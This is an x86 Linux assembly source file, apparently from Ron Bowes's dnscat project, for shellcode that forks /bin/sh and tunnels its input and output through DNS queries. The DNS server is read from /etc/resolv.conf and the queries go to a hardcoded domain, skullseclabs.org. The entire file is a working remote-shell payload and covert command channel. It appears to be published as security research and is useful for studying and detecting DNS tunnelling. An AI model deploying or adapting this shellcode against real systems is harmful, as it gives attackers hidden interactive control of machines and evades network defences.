; dnscat-shell.asm
; By Ron Bowes
; Created March, 2010
;
; (See LICENSE.txt)
;

BITS 32

jmp bottom
top:
 pop ebp
 sub esp, 512

; Get the system DNS server
call get_dns_server
mov [ebp], eax

; Bind a local socket
call get_socket
mov [ebp+4], eax

; Start the /bin/sh process
lea esi, [ebp+8] ; -> stdin pipe
lea edi, [ebp+16] ; -> stdout pipe
call start_shell 

; Get the fd list (note: this has to be above the call to start_shell because we whack it)
call get_fd_list
get_fd_list_top:
 pop dword [ebp+32]
 mov edi, dword [ebp+32]
 xor eax, eax
 mov ecx, 32 ; We're clearing 1024 bits, or 32 dwords
 rep stosd

timeout: ; On a timeout, we send a blank packet then return to select() (we also do that initially)
; Send a blank packet to kick things off
 mov eax, [ebp] ; dns server
 mov ebx, [ebp+4] ; socket
 xor edx, edx
 call send_packet

do_read:
 mov eax, [ebp+4] ; Set the udp socket
 call set

 mov eax, [ebp+16] ; Set the stdout socket
 call set

 ; ebx is going to be the maximum fd + 1 -- set that here
 mov ebx, [ebp+16] ; ebx -> read side of stdout
 cmp ebx, [ebp+4] ; compare it to the udp socket
 jg select_notbigger ; skip this if it's bigger
 mov ebx, [ebp+4] ; ebx -> udp socket (if it's bigger)
select_notbigger:
 inc ebx ; ebx = biggest socket + 1

 ; Set the timeout to 1 second
 mov dword [ebp+24], 1
; mov dword [ebp+28], 0 ; Doesn't really matter what the microseconds are

 ; Call select()
 mov eax, 0x8E ; select
 mov ecx, [ebp+32] ; readfds
 xor edx, edx ; writefds
 xor esi, esi ; exceptfds
 lea edi, [ebp+24] ; timeout
 int 0x80

 ; Check the response
 test eax, eax
 jz timeout ; go to timeout if the result is 0
 jge select_ok ; exit on an error
 xor eax, eax
 add eax, 1
 int 0x80 ; exit() -- don't care what the reason is

select_ok:
 ; Check if the UDP socket has traffic
check_udp:
 mov eax, [ebp+4]
 call isset
 jz check_stdout

 ; Read the response
 xor eax, eax
 add al, 3 ; 3 = read
 mov ebx, [ebp+4] ; fd - the UDP socket
 mov ecx, esp ; buf
 mov edx, 512 ; length
 int 0x80 ; read()
 ; Parse the response
; mov ecx, esp ; data -> still the stack
 mov edx, [ebp+12] ; target -> stdin_write
 call parse ; Parse the data on the stack and send it to stdin_write


check_stdout:
 mov eax, [ebp+16]
 call isset
 jz do_read

  ; read(stdout, 31)
 xor eax, eax
 add al, 3 ; 3 = read
 mov ebx, [ebp+0x10] ; fd
 mov ecx, esp ; buf
 lea edx, [eax+28] ; length -- we only want to read 31 bytes (62 encoded)
 int 0x80
 mov ebx, eax ; ebx -> length

 ; Encode the data (doubles the length of the string)
 mov ecx, esp ; buffer
 mov edx, ebx ; length
 call encode
 ; Send the data
 mov eax, [ebp] ; dns server
 lea edx, [ebx*2] ; length, doubled
 mov ebx, [ebp+4] ; socket
 mov ecx, esp ; data
 call send_packet

 jmp do_read ; Go back to the select

 add esp, 512
 ret 

; Data
bottom:
call top
db 'AAAA'     ; [0] dns server
db 'BBBB'     ; [4] socket
db 'CCCCDDDD' ; [8] stdin pipe
db 'EEEEFFFF' ; [16] stdout pipe
dd 0x00000001, 0x00000000 ; [24] Timeval (for select()) -- 1 second timeout
dd 'JJJJ' ; [32] ptr to fd list

;;; getbit()
; eax = the socket
; return: eax = the byte, edx = the bit
getbit:
 mov ecx, 8 ; We're going to divide by 8
 cdq ; Clear edx
 div ecx ; eax = which byte, edx = which bit
 ret

;;; set()
; eax = the socket
; ebp = the data structure from main
set:
 call getbit
 mov edi, [ebp+32]
 lea edi, [edi+eax]
 mov cl, dl
 xor esi, esi
 inc esi
 shl esi, cl
 or  [edi], esi
 ret

;;; isset()
; eax = the socket
; ebp = the data structure from main
isset:
 call getbit
 mov edi, [ebp+32]
 lea edi, [edi+eax]
 mov cl, dl
 xor esi, esi
 inc esi
 shl esi, cl

 xor eax, eax
 test [edi], esi
 ret

;;; parse()
; ecx = start of the packet
; edx = handle where we're sending the data
parse:
 mov esi, ecx ; esi -> start of packet
 lea esi, [ecx+12] ; esi -> start of the first question
 mov edi, edx ; edi -> handle to send data

 ; Find the first null byte, which indicates that the question is over
findnull:
 inc esi
 cmp byte [esi], 0x00
 jne findnull

 ; Add 5 to get past the null and the type/class
 add esi, 5

 ; Check if the first bit in the echoed question is '1' -- that tells us the name is shrunk to one byte
 test byte [esi], 0x80
 jnz echo_encoded
 
echo_findnull:
 inc esi
 cmp byte [esi+1], 0x00 ; Check the next byte so in a second, we can add one to it to get past the null
 jne echo_findnull

echo_encoded:
 add esi, 12 ; 1 to get past the last character, 11 more to get past the null (1), the class/type (4), the TTL (4), and the length (2)

 ; Now we should be sitting on the length of the 'dnscat' string
 movzx ecx, byte [esi]
 lea esi, [esi+ecx+1]

 ; Now we should be sitting on the length of the 'flags' string
 movzx ecx, byte [esi]
 lea esi, [esi+ecx+2]

 ; Now we should be sitting on the length of the 'section count' string
; inc esi ; accounted for in the last addition

 ; Now we're on the section count string. Read it. 
 xor ebx, ebx
 mov bl, byte [esi]
 and bl, 0x0F ; ebx => number of sections
 ; We should now be sitting on the length of the first section

parse_top:
 ; Check if we're out of sections, then decrement the count
 test ebx, ebx
 jz parse_end
 dec ebx

 ; Read the size of this section
 inc esi
 movzx edx, byte [esi] ; edx -> size of this section

 parse_sub_top:
  ; Read the next two characters
  inc esi
  dec edx
  mov ah, byte [esi]
  and ah, 0xDF ; Remove case
  sub ah, 0x41

  inc esi
  dec edx
  mov al, byte [esi]
  and al, 0xDF ; Remove case
  sub al, 0x41

  shl ah, 4
  or  al, ah

  push edx ; Preserve
  push ebx ; Preserve

  ; Write the character to our pipe
  mov byte [esi], al ; Store the byte over the current character (we need a string for when we 'write' it)
  mov ax, 4 ; 4 = write
  mov ebx, edi ; fd
  lea ecx, [esi]
  xor edx, edx ; edx = length
  inc edx
  int 0x80

  pop ebx ; Restore
  pop edx ; Restore

  test edx, edx
  jnz parse_sub_top
 jmp parse_top
parse_end:

 ret



;;; encode()
; Encodes in netbios-style, effectively doubling the length of the string
; This is actually done backwards, from the end, which lets us re-use the buffer
; ecx = data
; edx = length
encode:

 lea edi, [edx*2] ; edi now indexes the last encoded character

encode_top:
 dec edx
 mov ah, byte [ecx+edx] ; Encode the left nibble
 shr ah, 0x04
 add ah, 'A'
 mov al, byte [ecx+edx] ; Encode the right nibble
 and al, 0x0F
 add al, 'A'

 dec edi
 mov byte [ecx+edi], al
 dec edi
 mov byte [ecx+edi], ah

 test edx, edx
 jnz encode_top

 ret


;;; send_packet()
; Send out the DNS packet. 
; eax = dns server
; ebx = socket
; ecx = data (encoded -- no more than 62 bytes)
; edx = length
send_packet_top:
 pop esi ; esi -> sockaddr
 lea edi, [esi+16] ; edi -> the packet

 push ebp ; Save ebp

 ; Set the dns server
 mov byte [esi+7], al
 mov byte [esi+6], ah
 shr eax, 16
 mov byte [esi+5], al
 mov byte [esi+4], ah

 push esi ; Preserve registers
 push edi

 test dl, dl
 jz send_packet_blank

 ; Add the lengtha
 mov byte [edi+22], '1' ; #sections -> 1
 mov byte [edi+23], dl ; Store the length value

 ; Copy the encoded data into the packet
 mov esi, ecx ; esi -> (source) encoded data
 add edi, 24 ; edi -> (dest) start of packet's data
 mov ecx, edx ; ecx -> count
 rep movsb ; Move the data into the dns packet

 ; Calculate the updated length of the packet (edx is the encoded name, and there are 24 bytes before it including the length)
 lea edx, [edx+28] ; Add the length, and also the TYPE/CLASS from later)

 jmp send_packet_continue

send_packet_blank:
 ; edi has to point to the domain's start
 add edi, 22 ; edi -> #sections
 mov byte [edi], '0'
 inc edi ; edi -> start of domain
 mov edx, 27 ; edx -> length of packet (including the TYPE/CLASS from later)

send_packet_continue:

 ; Add the domain to the packet
 jmp long get_domain
get_domain_top:
 pop esi
 xor ecx, ecx
domain_top:
 mov al, byte [esi+ecx] ; al -> the current byte of the domain
 mov byte [edi+ecx], al ; current byte in packet -> al
 inc ecx ; Increment the counter
 inc edx ; Increment the packet length
 test al, al
 jnz domain_top

 ; Add the domain type/class
 mov word [edi+ecx], 0x0500 ; 0x0005 = CNAME
 mov word [edi+ecx+2], 0x0100 ; 0x0001 = IN
 ; Increment the packet length by 4 since we added 4 bytes
; add edx, 4 ; I rolled this add into an earlier addition

; Restore registers
 pop edi
 pop esi

 ; sendto()
 xor eax, eax
 add al, 16
 push eax  ; sockaddr length
 push esi  ; sockaddr
 xor al, al
 push eax  ; flags
 push edx  ; length
 push edi  ; packet
 push ebx  ; socket
 xor ebx, ebx
 add al, 102 ; socketcall
 add bl, 11 ; sendto
 mov ecx, esp
 int 0x80
 add esp, 0x18

 pop ebp ; Restore ebp
 ret

send_packet:
 call send_packet_top
 ; Remote sockaddr
 dw 0x0002 ; sin_family = AF_INET
 dw 0x3500 ; remote port = any
 dd 0x0100007F ; remote address (will be changed)
 db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ; padding
 ; dns packet
 db 0x12, 0x34 ; transaction id
 db 0x01, 0x00 ; flags
 db 0x00, 0x01 ; questions
 db 0x00, 0x00 ; answers
 db 0x00, 0x00 ; authority
 db 0x00, 0x00 ; additional
 db 0x06, 'dnscat' ; dnscat signature
 db 0x01, '0' ; flags
 db 0x01,  ; number of sections (note: we don't need the actual number, it'll be added)
 ; Note: Up to 62 bytes (plus the domain) of code/data below here is going ot get whacked. 

;-------------------------------------------------
; (Everything below here are startup functions and can be whacked once the recv loop is going
;-------------------------------------------------

;;; start_shell()
; Only called once; after it's done, we re-use this code for storing the DNS packet
; esi = [out] stdin pipe
; edi = [out] stdout pipe
start_shell_top:
 pop ecx ; ecx = /bin/sh

 mov edx, ecx ; edx -> /bin/sh

 ; pipe(stdin)
 xor eax, eax
 add al, 0x2a
 mov ebx, esi
 int 0x80

 ; pipe(stdout)
 add al, 0x2a
 mov ebx, edi
 int 0x80

 ; fork()
 xor ecx, ecx
 xor ebx, ebx
 add al, 2
 int 0x80
 test eax, eax
jnz parent

child:
 add al, 0x3F
 mov ebx, esi
 xor ecx, ecx
 mov ebx, [ebx]
 int 0x80 ; dup2(stdin[READ], STDIN)

 xor eax, eax
 add al, 0x3F
 mov ebx, [edi+4]
 xor ecx, ecx
 inc ecx
 int 0x80 ; dup2(stdout[WRITE], STDOUT)

; mov eax, 0x3F ; Don't bother with stderr
; mov ebx, edi
; add ebx, 4
; mov ecx, 2
; mov ebx, [ebx]
; int 0x80 ; dup2(stdout[WRITE], STDERR)

 mov eax, 0x0B
 lea ebx, [edx+8] ; ebx = start of string (/bin/sh)
 mov [edx], ebx
 mov ecx, edx ; ecx = pointer to the string
 mov edx, [edx+4] ; edx = pointer to NULL
 int 0x80 ; execve()

 int 0xCC

parent:
; why bother closing?
; mov eax, 6
; mov ebx, [esi]
; int 0x80 ; close(stdin[READ])
;
; mov eax, 6
; mov ebx, edi
; add ebx, 4
; mov ebx, [ebx]
; int 0x80 ; close(stdout[WRITE])

 ret
 
start_shell:
 call start_shell_top
 dd 0x00000000
 dd 0x00000000
 db '/bin/sh',0


;;; get_byte()
; Staring at esi, read in a base-10 integer that goes until the first symbol, add it as the right-most byte
; in eax, shifting the others over.
; esi is updated to the character after the one that ended the string
;
; This is only called during startup; afterwards, this space is used to store the list of file descriptors
 get_fd_list:
 call get_fd_list_top
get_byte:
 push eax ; Preserve

 xor edx, edx ; Zero out the result

get_byte_top:
 cmp byte [esi], 0x30 ; If the current digit is under 0x30, we're done (at this point, it's numbers + '.')
 jl get_byte_done

 and byte [esi], 0x0F ; Convert the character to a number

 ; Multiply our current number by the base before continuing
 shl edx, 3
 lea edx, [edx+edx*2]

 ; Read the next number and add it to the full number
 add dl, byte [esi]
 inc esi ; Go to the next byte

 jmp get_byte_top ; And jump to the top

get_byte_done:
 pop eax ; Add the next byte to the address
 shl eax, 8
 or al, dl
 inc esi
 ret

;;; get_socket()
 get_socket_top:
 pop esi
 mov edi, esi

 xor eax, eax ; Zero out our packet (sets the local port + local addr to any)
 mov ecx, 16
 rep stosd

 mov byte [esi], 2 ; Socket family = AF_INET

 ; socket(AF_INET, SOCK_DGRAM, 0)
 add al, 102 ; socketcall
 xor ebx, ebx
 or bl, 2
 push ecx ; protocol = 0
 push ebx ; type = SOCK_DGRAM
 push ebx ; domain = AF_INET
 dec ebx ; ebx = 1 (socket)
 mov ecx, esp
 int 0x80
 add esp, 0x0c
 mov edi, eax ; edi -> socket

 ; bind()
 mov ax, 102 ; socketcall
 add bl, 15
 push ebx ; sockaddr length = 16
 sub bl, 14 ; ebx = 2 (bind)
 push esi ; sockaddr
 push edi ; s
 mov ecx, esp
 int 0x80
 add esp, 0x0c

 mov eax, edi
 ret

get_socket: ; 16 bytes
 call get_socket_top



;;; is_ip()
; Starting at esi, see if there's a plausable IPv4 address there
; All we actually do is check if the first four characters contain a probable letter -- will work for pretty much all cases

is_ip:
 xor eax, eax
 cmp byte [esi], 32 ; Check for a space
 jle is_ip_no
 test dword [esi], 0x40404040 ; numbers and periods are under 0x40, letters aren't
 setz al
is_ip_no:
 ret


;;; get_dns_server() ;;;
get_dns_server_top:
 pop esi ; esi => filename

 sub esp, 256 ; Make room on the stack

 ; Open /etc/resolv.conf
 mov ebx, esi  ; filename
 xor ecx, ecx  ; flags
 xor eax, eax
 add al, 5 ; 5 = open
 int 0x80

 ; Read it
 mov ebx, eax ; fd
 mov ecx, esp ; buffer
 mov edx, 255
 xor eax, eax
 add al, 3 ; 3 = read
 int 0x80

 ; esi => The beginning of the file
 mov esi, esp

 ; Search for the first space
find_ip:
 inc esi
 call is_ip ; Check if we're at a valid looking ip address
 test al, al
 jz find_ip

 ; esi now points to the first number in the string
 xor eax, eax
 xor ebx, ebx
 or bl, 4 ; loop 4 times
get_bytes_top:
 call get_byte ; get the next byte
 dec ebx ; decrement the counter
jnz get_bytes_top

 add esp, 256
 ret

get_dns_server:
 call get_dns_server_top
 db '/etc/resolv.conf',0

get_domain: 
 call get_domain_top
 db 1, 'a'
 db 12,'skullseclabs' ; <-- To modify domain, change this...
 db 3,'org' ; <-- and this. The number is the section length.
 db 0

